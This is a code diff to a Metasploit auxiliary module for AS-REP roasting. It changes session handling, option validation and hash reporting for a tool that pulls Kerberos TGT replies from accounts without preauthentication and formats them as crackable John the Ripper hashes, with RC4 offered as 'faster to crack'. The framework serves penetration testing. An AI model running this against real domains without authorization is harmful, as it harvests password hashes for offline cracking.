@@ -43,16 +43,11 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        Opt::RHOSTS(nil, true, 'The target KDC, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html'),
         OptPath.new('USER_FILE', [ false, 'File containing usernames, one per line' ], conditions: %w[ACTION == BRUTE_FORCE]),
         OptBool.new('USE_RC4_HMAC', [ true, 'Request using RC4 hash instead of default encryption types (faster to crack)', true]),
         OptString.new('Rhostname', [ false, "The domain controller's hostname"], aliases: ['LDAP::Rhostname']),
       ]
     )
-    register_option_group(name: 'SESSION',
-                          description: 'Used when connecting to LDAP over an existing SESSION',
-                          option_names: %w[RHOSTS],
-                          required_options: %w[SESSION RHOSTS])
     register_advanced_options(
       [
         OptEnum.new('LDAP::Auth', [true, 'The Authentication mechanism to use', Msf::Exploit::Remote::AuthOption::NTLM, Msf::Exploit::Remote::AuthOption::LDAP_OPTIONS]),
@@ -82,11 +77,12 @@ class MetasploitModule < Msf::Auxiliary
     user_file = datastore['USER_FILE']
     username = datastore['LDAPUsername']
     if user_file.blank? && username.blank?
-      fail_with(Msf::Module::Failure::BadConfig, 'User file or username must be specified when brute forcing')
+      fail_with(Msf::Module::Failure::BadConfig, 'User file or username must be specified when brute forcing.')
     end
+    verify_option('LDAPDomain')
     if username.present?
       begin
-        roast(datastore['LDAPUsername'])
+        roast(username)
         result_count += 1
       rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
         # User either not present, or requires preauth
@@ -113,36 +109,52 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
+  def verify_option(opt)
+    value = datastore[opt]
+    if session.nil? && value.blank?
+      fail_with(Msf::Module::Failure::BadConfig, "You must set the '#{opt}' option when running the module without a pre-existing LDAP session.")
+    end
+  end
+
   def run_ldap
+    verify_option('LDAPDomain')
+
     run_builtin_ldap_query('ENUM_USER_ASREP_ROASTABLE') do |result|
       username = result.samaccountname[0]
       begin
         roast(username)
       rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
-        print_error("#{username} reported as ASREP-roastable, but received error when attempting to retrieve TGT (#{e})")
+        msg = session ? "Session #{session.sid} received an error: #{e}" : "#{username} reported as ASREP-roastable, but received error when attempting to retrieve TGT (#{e})"
+        print_error(msg)
       end
     end
   end
 
   def roast(username)
+    server_name = "krbtgt/#{datastore['domain']}"
+    client_name = username
+    realm = session ? session.client.realm : datastore['LDAPDomain']
+    rhost = session ? session.client.peerhost : datastore['RHOST']
+
     res = send_request_tgt(
-      server_name: "krbtgt/#{datastore['domain']}",
-      client_name: username,
-      realm: datastore['LDAPDomain'],
+      server_name: server_name,
+      client_name: client_name,
+      realm: realm,
       offered_etypes: etypes,
       rport: 88,
-      rhost: datastore['RHOST']
+      rhost: rhost
     )
+
     hash = format_as_rep_to_john_hash(res.as_rep)
     print_line(hash)
     jtr_format = Metasploit::Framework::Hashes.identify_hash(hash)
-    report_hash(hash, jtr_format)
+    report_hash(hash, jtr_format, rhost, 88)
   end
 
-  def report_hash(hash, jtr_format)
+  def report_hash(hash, jtr_format, address, port)
     service_data = {
-      address: rhost,
-      port: rport,
+      address: address,
+      port: port,
       service_name: 'Kerberos',
       protocol: 'tcp',
       workspace_id: myworkspace_id
